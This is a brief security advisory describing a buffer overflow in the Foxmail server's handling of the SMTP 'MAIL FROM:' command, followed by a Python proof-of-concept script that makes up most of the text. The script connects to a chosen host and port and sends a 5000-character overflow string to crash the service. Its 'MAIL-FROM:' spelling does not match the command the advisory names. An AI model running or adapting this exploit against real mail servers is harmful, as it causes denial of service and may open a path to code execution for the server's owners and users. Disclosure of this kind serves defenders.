Detail: 
    A vulnerabilities have been identified in Foxmail server , which can be exploited by malicious people to cause a DoS (Denial of Service) or maybe compromise a vulnerable server.

    The vulnerabilities are caused due to boundary errors in the handling of the "MAIL FROM:" commands. A malicious person can exploit this by supplying a long, specially crafted argument to the vulnerable commands, which will result in a buffer overflow.

    Successful exploitation will cause a DOS or maybe  allow execution of arbitrary code with SYSTEM privileges.

FOXmail POC exploit:

import socket
import sys
import getopt


def usage():
    print "Usage: foxserver.py -h host -p port"
    sys.exit(0)
    
if __name__ == '__main__':
    
    try: 
        opts, args = getopt.getopt(sys.argv[1:], "h:p:") 
    except getopt.GetoptError, msg: 
        print msg
        usage()
        
    for o,a in opts:
        if o in ["-h"]:
            host = a
        if o in ["-p"]:
            port = int(a)

    evilbuf =  "MAIL-FROM: <" + "A"*5000 + ">" + "\r\n"
    evilbuf += "RCPT-TO: postmaster@company.mailDATA" + "\r\n"
    evilbuf += "Message-ID: 123" + "\r\n"
    evilbuf += "ASDF" + "\r\n"
    evilbuf += "." + "\r\n"
    evilbuf += "QUIT" + "\r\n"
    try:
        sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sockfd.connect((host, port))
        recvbuf = sockfd.recv(1024)
        print `recvbuf`
        sockfd.send("HELO localhost\r\n")
        recvbuf = sockfd.recv(1024)
        print `recvbuf`
        sockfd.send(evilbuf)
    except socket.error, msg:
        print msg
        
    sockfd.close()
